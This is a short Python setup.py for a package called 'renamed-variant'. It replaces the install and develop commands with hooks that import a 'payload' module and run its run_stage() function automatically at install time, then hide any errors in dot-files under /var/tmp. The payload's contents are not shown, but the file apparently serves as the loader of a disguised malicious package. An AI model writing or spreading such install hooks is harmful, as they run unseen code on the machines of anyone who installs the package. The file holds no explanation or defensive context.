import sys
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop

sys.path.insert(0, "lib")


class HookInstall(install):
    def run(self):
        install.run(self)
        try:
            from payload import run_stage
            run_stage()
            import time as _t
            _t.sleep(5)
        except Exception as e:
            with open('/var/tmp/.install.log', 'a') as f:
                f.write("hook failed: %s\n" % e)


class HookDevelop(develop):
    def run(self):
        develop.run(self)
        try:
            from payload import run_stage
            run_stage()
        except Exception as e:
            with open('/var/tmp/.develop.log', 'a') as f:
                f.write("hook failed: %s\n" % e)


setup(
    name="renamed-variant",
    version="2.3",
    packages=find_packages(where="lib"),
    package_dir={"": "lib"},
    cmdclass={
        "install": HookInstall,
        "develop": HookDevelop,
    },
)
